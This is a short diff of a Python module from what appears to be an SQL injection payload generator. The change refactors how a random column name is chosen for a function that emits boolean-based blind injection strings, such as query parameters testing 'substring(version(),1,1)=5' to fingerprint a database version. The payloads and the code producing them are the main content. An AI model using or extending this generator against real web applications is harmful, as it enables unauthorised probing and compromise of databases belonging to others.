@@ -4,11 +4,12 @@ import sys
 sys.path.append(os.getcwd())
 import random
 from lib.core.common.column.commoncolumn import common_column
-_column = common_column()
-for column in _column:
-      pass
+from lib.core.common.column.commoncolumn import common_columns_list
 
-def sub_string_sql_inj(column=random.choice(column)):
+
+
+
+def sub_string_sql_inj(column=random.choice(common_columns_list)):
         payload = f"""
 ?{column}=1 and substring(version(),1,1)=5
 ?{column}=1 and right(left(version(),1),1)=5
@@ -25,4 +26,5 @@ rows = sub_string_sql_inj().split("\n")
 sorted_rows = sorted(rows) 
 sorted_payload = "\n".join(sorted_rows)
 for _sorted in sorted_payload.split("\n"):
-    pass
+        pass
+        
